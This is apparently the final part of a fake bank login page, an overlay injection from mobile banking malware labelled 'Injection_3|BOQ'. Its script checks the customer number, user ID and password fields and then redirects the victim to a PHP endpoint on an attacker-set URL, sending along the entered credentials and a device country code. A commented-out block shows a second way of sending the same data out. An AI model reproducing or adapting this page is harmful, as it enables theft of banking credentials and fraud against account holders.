                        var oIdInp = document.getElementById('userid');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oIdInp.className = oCodeInp.className = 'input';
						} catch(e){};
						
                        if (oNumInp.value.length < 4) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
                        if (oIdInp.value.length < 4) {
							try{
								oIdInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{6,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
				top['closeDlg'] = true;
				/*prompt('send', '{"dialog id" : "boq'+
					'", "customer_number": "'+oNumInp.value+
					'", "user_id" : "'+oIdInp.value+
					'", "password": "'+oCodeInp.value+'"}');
						
						document.getElementById('content_div').style.visibility = 'hidden';
						g_oForm.submit();*/
						
						
						var url='<?php echo $URL; ?>';
						var imei_c='<?php echo $IMEI_country; ?>';
						location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|BOQ|"+oNumInp.value+"|"+oCodeInp.value+"|"+oIdInp.value);
						
						
						return false;
                    };

                })();
            </script>

</div>
</body>
</html>
